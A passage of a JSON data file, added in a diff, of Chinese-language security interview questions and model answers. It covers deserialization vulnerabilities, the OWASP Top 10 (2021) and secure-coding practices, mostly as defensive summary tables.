+    "answer": "## 核心概念\n\n反序列化漏洞是指应用程序在反序列化不可信数据时，执行恶意代码或触发危险操作的安全漏洞。\n\n## 攻击原理\n\n```text\n序列化: 对象 → 字节流\n反序列化: 字节流 → 对象\n\n攻击:\n1. 攻击者构造恶意序列化数据\n2. 应用程序反序列化该数据\n3. 触发恶意代码执行\n\nJava示例:\nObjectInputStream ois = new ObjectInputStream(inputStream);\nObject obj = ois.readObject();\n→ 如果obj包含恶意代码，会被执行\n```\n\n## 反序列化漏洞危害\n\n| 危害 | 说明 |\n|------|------|\n| **远程代码执行** | 执行任意命令 |\n| **拒绝服务** | 耗尽资源 |\n| **权限提升** | 获取更高权限 |\n| **数据泄露** | 读取敏感数据 |\n\n## 常见漏洞组件\n\n| 语言 | 组件 |\n|------|------|\n| Java | Apache Commons Collections, Spring, Fastjson |\n| PHP | unserialize() |\n| Python | pickle, yaml |\n| .NET | BinaryFormatter |\n\n## 防御措施\n\n| 措施 | 说明 |\n|------|------|\n| **避免反序列化不可信数据** | 最根本的防御 |\n| **使用安全的序列化格式** | JSON、Protocol Buffers |\n| **白名单类** | 限制可反序列化的类 |\n| **输入验证** | 验证序列化数据 |\n| **更新组件** | 修复已知漏洞 |\n\n## 关键要点\n\n- **不要反序列化**不可信的数据\n- **JSON**比Java原生序列化更安全\n- **白名单**可以限制可实例化的类\n- 及时**更新依赖**组件\n\n## 面试高频追问\n\n1. 为什么JSON比Java原生序列化更安全？\n2. Fastjson漏洞的原理是什么？\n3. 如何安全地进行对象序列化？",
+    "tags": [
+      "反序列化",
+      "RCE",
+      "Java安全"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-034",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是OWASP Top 10？列举主要的安全风险",
+    "answer": "## 核心概念\n\nOWASP Top 10是Web应用安全风险的权威排名，由OWASP（开放式Web应用程序安全项目）定期更新。\n\n## OWASP Top 10 (2021)\n\n| 排名 | 风险 | 说明 |\n|------|------|------|\n| **A01** | 访问控制失效 | 权限检查不当，越权访问 |\n| **A02** | 加密机制失效 | 敏感数据未加密或加密不当 |\n| **A03** | 注入 | SQL注入、XSS、命令注入等 |\n| **A04** | 不安全设计 | 架构层面的安全缺陷 |\n| **A05** | 安全配置错误 | 默认配置、不必要的功能 |\n| **A06** | 自带缺陷和过时的组件 | 使用有漏洞的第三方库 |\n| **A07** | 身份识别和认证失败 | 弱密码、会话管理不当 |\n| **A08** | 软件和数据完整性失败 | 未验证更新、CI/CD安全 |\n| **A09** | 安全日志和监控失败 | 缺少日志和监控 |\n| **A10** | 服务端请求伪造（SSRF） | 服务器端请求伪造 |\n\n## 常见攻击对应\n\n| 攻击类型 | OWASP分类 |\n|----------|----------|\n| SQL注入 | A03 注入 |\n| XSS | A03 注入 |\n| CSRF | A01 访问控制失效 |\n| 越权访问 | A01 访问控制失效 |\n| 弱密码 | A07 身份识别失败 |\n| 使用有漏洞的库 | A06 过时组件 |\n| SSRF | A10 SSRF |\n\n## 防御原则\n\n| 原则 | 说明 |\n|------|------|\n| **纵深防御** | 多层安全防护 |\n| **最小权限** | 只授予必要权限 |\n| **安全默认** | 默认配置应安全 |\n| **纵深防御** | 多层安全防护 |\n\n## 关键要点\n\n- OWASP Top 10是Web安全的**基础知识**\n- **注入**和**访问控制**是最常见的风险\n- 安全是**持续的过程**，不是一次性工作\n- **安全开发生命周期**（SDL）可以系统性地降低风险\n\n## 面试高频追问\n\n1. 如何在开发流程中融入安全？\n2. 什么是安全开发生命周期？\n3. 如何进行安全测试？",
+    "tags": [
+      "OWASP",
+      "安全风险",
+      "Web安全"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-035",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是安全编码的最佳实践？",
+    "answer": "## 核心概念\n\n安全编码是在软件开发过程中遵循的一系列安全原则和实践，从源头减少安全漏洞。\n\n## 输入验证\n\n| 实践 | 说明 |\n|------|------|\n| **白名单验证** | 只允许已知安全的输入 |\n| **长度限制** | 限制输入长度 |\n| **类型验证** | 验证数据类型 |\n| **边界检查** | 检查数值范围 |\n\n## 输出编码\n\n| 场景 | 编码方式 |\n|------|----------|\n| HTML内容 | HTML实体编码 |\n| HTML属性 | 属性编码 |\n| JavaScript | JavaScript编码 |\n| URL参数 | URL编码 |\n| SQL查询 | 参数化查询 |\n\n## 认证和授权\n\n```text\n1. 密码安全:\n   - 使用加盐哈希存储\n   - 强制密码复杂度\n   - 防止暴力破解（限流、锁定）\n\n2. 会话安全:\n   - 登录后重新生成Session\n   - 设置合理的超时时间\n   - 使用安全的Cookie属性\n\n3. 权限控制:\n   - 最小权限原则\n   - 服务端验证权限\n   - 不信任客户端\n```\n\n## 敏感数据处理\n\n| 数据类型 | 处理方式 |\n|----------|----------|\n| 密码 | 加盐哈希，不存储明文 |\n| 信用卡 | PCI DSS合规，令牌化 |\n| API密钥 | 加密存储，定期轮换 |\n| 日志 | 不记录敏感信息 |\n\n## 错误处理\n\n```text\n原则:\n- 不暴露内部信息\n- 记录详细日志（服务器端）\n- 返回通用错误信息（客户端）\n\n错误信息:\n✗ \"数据库连接失败: mysql://root:password@localhost\"\n✓ \"服务器内部错误，请稍后重试\"\n```\n\n## 安全配置\n\n| 实践 | 说明 |\n|------|------|\n| **安全默认** | 默认配置应安全 |\n| **最小安装** | 只安装必要组件 |\n| **关闭调试** | 生产环境关闭调试模式 |\n| **更新依赖** | 及时更新第三方库 |\n\n## 关键要点\n\n- **不信任任何输入**是安全编码的核心\n- **纵深防御**，多层安全防护\n- 安全应该是**默认的**，不需要额外配置\n- **持续学习**安全知识，关注最新漏洞\n\n## 面试高频追问\n\n1. 什么是纵深防御？\n2. 如何在团队中推广安全编码？\n3. 什么是安全开发生命周期（SDL）？",
+    "tags": [
+      "安全编码",
+      "最佳实践",
+      "Web安全"
+    ],
+    "source": "高频"
+  }
+]
